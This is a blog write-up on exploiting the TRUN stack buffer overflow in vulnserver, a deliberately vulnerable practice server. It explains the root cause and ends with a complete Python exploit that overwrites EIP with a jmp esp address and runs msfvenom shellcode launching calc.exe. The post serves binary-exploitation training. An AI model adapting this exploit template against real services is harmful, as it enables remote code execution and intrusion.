---
layout: post
title:  "Vulnserver exploitation series :: TRUN (Vanilla EIP overwrite)"
date:   2021-07-24
categories: exploit
---




## Introduction



In this series of blog posts (Vulnserver exploitation series), I will be exploring an application named [**vulnserver**](https://github.com/stephenbradshaw/vulnserver).

This application is a perfect target to practice binary exploitation and fuzzing on Windows platforms.

To interact with the server, we can use "netcat", and as seen below, the server supports 14 commands:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210720010409790.png)



After fuzzing the server, it was possible to find out the vulnerable commands. Below are the results:

| #    | Command | State          |
| ---- | ------- | -------------- |
| 1    | HELP    | Safe           |
| 2    | STATS   | Safe           |
| 3    | RTIME   | Safe           |
| 4    | LTIME   | Safe           |
| 5    | SRUN    | Safe           |
| 6    | TRUN    | **Vulnerable** |
| 7    | GMON    | **Vulnerable** |
| 8    | GDOG    | Safe           |
| 9    | KSTET   | **Vulnerable** |
| 10   | GTER    | **Vulnerable** |
| 11   | HTER    | **Vulnerable** |
| 12   | LTER    | **Vulnerable** |
| 13   | KSTAN   | Safe           |
| 14   | EXIT    | Safe           |



In this blog post, I'll cover the TRUN command.



## Crashing the server



The TRUN command is vulnerable to a stack-based buffer overflow. After sending a large buffer, the server crashes, and the EIP gets overwritten:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705011004916.png)



Stack layout after the crash:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705011409777.png)





## Root cause of the vulnerability



The server checks if the message starts with `"TRUN "` and allocates a buffer with 3000 bytes:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705014409517.png)



Then it checks if there is a `"."` in the received message, and if it does, it copies 3000 bytes to the allocated buffer:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705014757348.png)



Next, it calls `_Function3`, which copies the 3000 bytes to a smaller buffer, causing a stack-based buffer overflow:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705015107553.png)



## Controlling the instruction pointer



After finding what was the offset to overwrite the instruction pointer (EIP) value, it was possible to set it to the arbitrary value of `42424242` just by sending the right amount of bytes.

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210705015416937.png)



Since Data Execution Prevention (DEP) wasn't enabled and ESP points to the data immediately past the arbitrary EIP value (42424242) on the stack, and because of that, overwriting the instruction pointer (EIP) with an instruction that jumps back to the stack and starts executing arbitrary shellcode is a **valid** option.



## Exploitation



As seen below, by overwriting the instruction pointer (EIP) with an "**jmp esp**" instruction, the server executed an arbitrary shellcode that creates a new "calc.exe" process:

![ ](/assets/images/vulnserver_trun_vanilla_eip/image-20210719162155468.png)



Full exploit code:

```python
#!/usr/bin/env python3
import socket
import sys

def exploit(ip, port):
    # msfvenom -p windows/exec -a x86 --platform windows CMD=calc.exe -b '\x00\x0a\x0d' -f python -e x86/xor_dynamic
    shellcode =  b""
    shellcode += b"\xeb\x23\x5b\x89\xdf\xb0\xed\xfc\xae\x75\xfd\x89\xf9"
    shellcode += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb1\xd9\x74"
    shellcode += b"\x08\x46\x80\x3e\xed\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
    shellcode += b"\xff\xff\xff\x17\xed\xeb\xff\x95\x17\x17\x17\x77\x9e"
    shellcode += b"\xf2\x26\xd7\x73\x9c\x47\x27\x9c\x45\x1b\x9c\x45\x03"
    shellcode += b"\x9c\x65\x3f\x18\xa0\x5d\x31\x26\xe8\xbb\x2b\x76\x6b"
    shellcode += b"\x15\x3b\x37\xd6\xd8\x1a\x16\xd0\xf5\xe5\x45\x40\x9c"
    shellcode += b"\x45\x07\x9c\x5d\x2b\x9c\x5b\x06\x6f\xf4\x5f\x16\xc6"
    shellcode += b"\x46\x9c\x4e\x37\x16\xc4\x9c\x5e\x0f\xf4\x2d\x5e\x9c"
    shellcode += b"\x23\x9c\x16\xc1\x26\xe8\xbb\xd6\xd8\x1a\x16\xd0\x2f"
    shellcode += b"\xf7\x62\xe1\x14\x6a\xef\x2c\x6a\x33\x62\xf3\x4f\x9c"
    shellcode += b"\x4f\x33\x16\xc4\x71\x9c\x1b\x5c\x9c\x4f\x0b\x16\xc4"
    shellcode += b"\x9c\x13\x9c\x16\xc7\x9e\x53\x33\x33\x4c\x4c\x76\x4e"
    shellcode += b"\x4d\x46\xe8\xf7\x48\x48\x4d\x9c\x05\xfc\x9a\x4a\x7d"
    shellcode += b"\x16\x9a\x92\xa5\x17\x17\x17\x47\x7f\x26\x9c\x78\x90"
    shellcode += b"\xe8\xc2\xac\xe7\xa2\xb5\x41\x7f\xb1\x82\xaa\x8a\xe8"
    shellcode += b"\xc2\x2b\x11\x6b\x1d\x97\xec\xf7\x62\x12\xac\x50\x04"
    shellcode += b"\x65\x78\x7d\x17\x44\xe8\xc2\x74\x76\x7b\x74\x39\x72"
    shellcode += b"\x6f\x72\x17\xb1\xd9"

    buf = b""
    buf += b"TRUN ."
    buf += b"\x41" * 2006
    buf += b"\xaf\x11\x50\x62"    # 0x625011af jmp esp @ essfunc.dll
    buf += shellcode
    buf += b"\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, int(port)))
        s.send(buf)
        print("exploit sent!")
    except Exception as e:
        print(e)

def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>")
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    exploit(ip, port)

if __name__ == "__main__":
    main()
```



